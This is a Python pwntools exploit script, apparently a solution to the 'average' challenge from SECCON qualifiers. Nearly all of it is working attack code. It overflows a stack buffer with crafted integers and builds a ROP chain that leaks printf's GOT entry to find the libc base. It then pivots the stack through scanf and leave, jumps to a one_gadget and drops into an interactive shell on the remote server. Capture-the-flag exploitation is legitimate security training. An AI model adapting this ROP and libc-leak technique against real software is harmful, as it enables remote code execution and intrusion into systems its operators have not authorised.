from pwn import *

# p = process('./average')
p = remote('average.quals.seccon.jp', 1234)
# p = remote('localhost', 7777)
e = ELF('./average')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')

# one_gadget = [0x10a41c, 0x4f432, 0x4f3d5]
one_gadget = [0xdf54c, 0xdf54f, 0xdf552]

base = 0x404060 + 0x100
arg = 0x402008

pop_rdi = 0x4013a3
pop_rbp = 0x40115d
pop_rsi_r15 = 0x4013a1
leave = 0x40133e
ret = 0x40101a

def f(k):
    p.sendlineafter(b']: ', str(k))

n = 0x19
p.sendlineafter(b'n: ', str(n))

for i in range(0x13):
    f(n)

f(0x13)
f(n)

f(pop_rdi)
f(e.got['printf'])
f(e.plt['puts'])
f(e.symbols['main'])

p.recvline()

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['printf']
print(hex(libc.address))

n = 0x1e
p.sendlineafter(b'n: ', str(n))

for i in range(0x13):
    f(n)

f(0x13)
f(n)

f(pop_rdi)
f(arg)
f(pop_rsi_r15)
f(base)
f(0)
f(e.plt['__isoc99_scanf'])
f(pop_rbp)
f(base - 0x8)
f(leave)

p.sendline(str(libc.address + one_gadget[1]))

p.interactive()
